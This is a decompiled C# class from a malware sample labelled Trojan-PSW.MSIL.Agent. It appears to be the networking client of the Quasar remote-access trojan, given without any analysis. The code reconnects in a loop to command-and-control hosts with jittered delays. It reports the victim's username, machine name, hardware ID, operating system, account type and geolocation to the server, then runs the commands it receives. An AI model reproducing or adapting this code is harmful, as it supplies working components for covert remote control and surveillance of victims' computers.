// Decompiled with JetBrains decompiler
// Type: Quasar.Client.Networking.QuasarClient
// Assembly: Client, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73C3C7FC-0EA2-48C4-8CEF-33A8CFDA287C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.MSIL.Agent.anew-0b84e664c8b592aa0220d52841629b2accb41f1f624720331000ab5f2f0ed628.exe

using Quasar.Client.Config;
using Quasar.Client.Helper;
using Quasar.Client.IO;
using Quasar.Client.IpGeoLocation;
using Quasar.Client.User;
using Quasar.Common.DNS;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Common.Utilities;
using System;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

namespace Quasar.Client.Networking
{
  public class QuasarClient : Quasar.Client.Networking.Client, IDisposable
  {
    private bool _identified;
    private readonly HostsManager _hosts;
    private readonly SafeRandom _random;
    private readonly CancellationTokenSource _tokenSource;
    private readonly CancellationToken _token;

    public QuasarClient(HostsManager hostsManager, X509Certificate2 serverCertificate)
      : base(serverCertificate)
    {
      this._hosts = hostsManager;
      this._random = new SafeRandom();
      this.ClientState += new Quasar.Client.Networking.Client.ClientStateEventHandler(this.OnClientState);
      this.ClientRead += new Quasar.Client.Networking.Client.ClientReadEventHandler(this.OnClientRead);
      this.ClientFail += new Quasar.Client.Networking.Client.ClientFailEventHandler(this.OnClientFail);
      this._tokenSource = new CancellationTokenSource();
      this._token = this._tokenSource.Token;
    }

    public void ConnectLoop()
    {
      while (true)
      {
        CancellationToken token = this._token;
        if (!token.IsCancellationRequested)
        {
          if (!this.Connected)
          {
            Host nextHost = this._hosts.GetNextHost();
            this.Connect(nextHost.IpAddress, nextHost.Port);
          }
          while (this.Connected)
          {
            try
            {
              token = this._token;
              token.WaitHandle.WaitOne(1000);
            }
            catch (Exception ex) when (ex is NullReferenceException || ex is ObjectDisposedException)
            {
              this.Disconnect();
              return;
            }
          }
          token = this._token;
          if (!token.IsCancellationRequested)
            Thread.Sleep(Settings.RECONNECTDELAY + this._random.Next(250, 750));
          else
            break;
        }
        else
          goto label_4;
      }
      this.Disconnect();
      return;
label_4:;
    }

    private void OnClientRead(Quasar.Client.Networking.Client client, IMessage message, int messageLength)
    {
      if (!this._identified)
      {
        if (!(message.GetType() == typeof (ClientIdentificationResult)))
          return;
        this._identified = ((ClientIdentificationResult) message).Result;
      }
      else
        MessageHandler.Process((ISender) client, message);
    }

    private void OnClientFail(Quasar.Client.Networking.Client client, Exception ex) => client.Disconnect();

    private void OnClientState(Quasar.Client.Networking.Client client, bool connected)
    {
      this._identified = false;
      if (!connected)
        return;
      GeoInformation geoInformation = GeoInformationFactory.GetGeoInformation();
      UserAccount userAccount = new UserAccount();
      client.Send<ClientIdentification>(new ClientIdentification()
      {
        Version = Settings.VERSION,
        OperatingSystem = Quasar.Common.Helpers.PlatformHelper.FullName,
        AccountType = userAccount.Type.ToString(),
        Country = geoInformation.Country,
        CountryCode = geoInformation.CountryCode,
        ImageIndex = geoInformation.ImageIndex,
        Id = HardwareDevices.HardwareId,
        Username = userAccount.UserName,
        PcName = SystemHelper.GetPcName(),
        Tag = Settings.TAG,
        EncryptionKey = Settings.ENCRYPTIONKEY,
        Signature = Convert.FromBase64String(Settings.SERVERSIGNATURE)
      });
    }

    public void Exit()
    {
      this._tokenSource.Cancel();
      this.Disconnect();
    }

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }

    protected virtual void Dispose(bool disposing)
    {
      if (!disposing)
        return;
      this._tokenSource.Cancel();
      this._tokenSource.Dispose();
    }
  }
}
